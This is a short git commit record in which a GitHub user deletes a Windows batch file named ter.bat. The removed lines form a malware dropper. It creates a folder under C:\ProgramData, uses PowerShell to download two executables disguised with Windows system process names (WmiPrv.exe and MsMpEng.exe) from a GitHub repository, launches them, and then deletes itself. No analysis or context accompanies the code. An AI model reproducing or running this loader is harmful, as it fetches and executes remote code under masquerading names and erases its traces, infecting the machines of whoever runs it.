f660afaa6f44b84c1a21d33a9f556743f448e85e
wazgame <130532029+wazgame@users.noreply.github.com>
2023-04-16 10:39:30 +0300

    Delete ter.bat

--- ter.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-mkdir C:\ProgramData\Distribution
-powershell.exe iwr https://github.com/wazgame/waz/raw/main/WmiPrv.exe -o C:\ProgramData\Distribution\WmiPrv.exe
-powershell.exe iwr https://github.com/wazgame/waz/raw/main/MsMpEng.exe -o C:\ProgramData\Distribution\MsMpEng.exe
-start \wait C:\ProgramData\Distribution\WmiPrv.exe C:\ProgramData\Distribution\MsMpEng.exe
-del/a/f "%~f0"
